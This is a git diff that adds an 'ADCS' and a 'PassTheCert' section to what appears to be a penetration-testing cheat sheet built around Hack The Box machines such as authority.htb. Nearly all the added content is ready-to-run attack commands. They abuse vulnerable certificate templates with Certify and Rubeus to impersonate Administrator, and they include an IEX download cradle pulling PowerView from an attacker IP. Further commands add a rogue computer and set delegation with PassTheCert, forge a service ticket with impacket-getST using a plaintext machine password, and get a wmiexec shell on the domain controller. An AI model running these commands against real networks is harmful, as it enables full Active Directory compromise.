@@ -62,6 +62,7 @@
     - [LOLBIN](#lolbin)
     - [token](#token-1)
     - [S4U](#s4u)
+    - [ADCS](#adcs)
   - [Linux](#linux-2)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
@@ -609,6 +610,30 @@ Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 
 .\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
 .\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:svc_ldap /msdsspn:cifs/TEST.authority.htb /ptt
+```
+### ADCS
+```powershell
+.\Certify.exe find /vulnerable
+.\Certify.exe request /ca:<CA Name> /template:<Template Name> /altname:Administrator
+
+openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
+Cryptographic Provider v1.0" -export -out admin.pfx
+
+.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /password:
+```
+#### PassTheCert
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
+
+wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x86/PassTheCert.exe
+
+.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --add-computer --computer-name <Computer Name>
+Get-DomainComputer authority
+Get-DomainComputer <Computer Name>
+.\PassTheCert.exe --server <server-ip or fqdn> --cert-path <pfx-path> --rbcd --target <CN=DC,OU=Domain Controllers,DC=example,DC=com> --sid <Resource-SID>
+
+impacket-getST -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/DESKTOP-1337$:99U1VOMhRX6LEvISJJQ9PMo07osUJLcp'
+impacket-wmiexec -k -no-pass authority.htb/Administrator@authority.authority.htb
 ```
 
 ## Linux
